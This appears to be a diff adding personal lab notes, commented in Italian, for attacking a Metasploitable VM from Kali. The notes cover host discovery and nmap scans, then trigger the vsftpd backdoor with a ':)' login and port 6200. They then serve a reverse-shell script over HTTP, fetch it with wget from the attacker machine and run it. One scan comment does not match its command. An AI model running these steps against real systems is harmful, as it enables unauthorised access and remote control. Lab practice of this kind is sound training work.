@@ -1,0 +1,44 @@
+kali@kali:~$ sudo netdiscover
+
+# 192.168.1.1	    pfsense
+# 192.168.1.100	    metasploitable
+# 192.168.1.101     kali
+
+# -sV versione applicazione in ascolto sulla porta
+kali@kali:~$ nmap -sV 192.168.1.100
+
+# -sS scansione SYN
+kali@kali:~$ nmap -sS 192.168.1.100
+
+# -sF scansione FIN
+kali@kali:~$ nmap -sF 192.168.1.100
+
+# -sX scansione XMas
+kali@kali:~$ nmap -sS 192.168.1.100
+
+
+# Ricerca porte aperte
+kali@kali:~$ nmap 192.168.1.100
+
+# Sfruttare vulnerabilità
+    # in un terminale
+    kali@kali:~$ nc 192.168.1.100 21
+    user Hacker:)
+    pass invalid
+
+    # in un altro terminale
+    kali@kali:~$ nc 192.168.1.100 6200
+
+# avvio del server a cui si colleghera la reverse shell
+kali@kali:~$ python3 ~/Desktop/shell/shellServer.py
+
+# server http per far scaricare reverseShell.py
+kali@kali:~$ cd ~/Desktop/shell
+kali@kali:~Desktop/shell$ python3 -m http.server 8080
+
+# scaricare e avviare reverse shell verso macchina Kali
+kali@kali:~$ nc 192.168.1.100 6200
+mkdir shell
+cd shell
+wget 192.168.1.101:8080/reverseShell.py
+python reverseShell.py 192.168.1.101 &
